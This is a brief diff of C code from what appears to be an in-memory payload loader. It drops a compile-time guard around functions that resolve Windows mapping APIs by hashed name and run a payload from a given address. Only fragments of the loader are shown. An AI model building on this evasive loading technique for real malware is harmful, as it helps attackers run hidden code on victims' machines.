@@ -3,7 +3,7 @@
 #include "../../../includes/core/core.h"
 
 
-#ifdef MEMORY_MAPPEDMEM_LOCAL
+
 BOOL memory_load_apis() {
 	g_ldr->apis->CreateFileMappingA = (pCreateFileMappingA)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATESECTION);
 	g_ldr->apis->MapViewOfFile = (pMapViewOfFile)GetProc(g_ldr->apis->modules.kernel32, HASHED_MAPVIEWOFFILE);
@@ -38,4 +38,3 @@ MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
 	memInfo.BytesWrote = PayloadAddress;
 	return memInfo;
 }
-#endif
